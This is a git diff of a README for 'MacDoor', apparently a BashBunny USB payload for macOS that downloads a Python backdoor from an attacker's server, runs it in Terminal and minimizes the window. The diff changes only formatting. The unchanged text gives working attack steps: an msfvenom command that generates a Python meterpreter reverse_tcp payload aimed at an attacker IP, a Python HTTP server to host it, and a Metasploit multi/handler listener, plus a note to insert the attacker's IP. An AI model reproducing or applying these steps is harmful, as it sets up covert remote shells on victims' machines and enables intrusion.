@@ -1,6 +1,5 @@
 # MacDoor - Python Backdoor Execution for the BashBunny
 
-
     __  ___              ____                     
    /  |/  /____ _ _____ / __ \ ____   ____   _____
   / /|_/ // __ `// ___// / / // __ \ / __ \ / ___/
@@ -14,17 +13,17 @@
 * Tested on:  Ventura 13.3.1
 * Category:   Execution
 
-# DESCRIPTION
+# Description
 
 Download a Python backdoor from our server, run it in terminal and minimize the terminal window.
 
-# STEPS
+# Steps
 
 * Step 1: msfvenom -p python/meterpreter/reverse_tcp LHOST={your IP} LPORT=4444 -o backdoor.py  
 * Step 2: mount a local server 'python3 -m http.server'  
 * Step 3: msfconsole multi/handler listener open before the attack.
 
-# NOTE
+# Note
 
 * You need to modify the script with your attacker IP and the port or your local server.
 
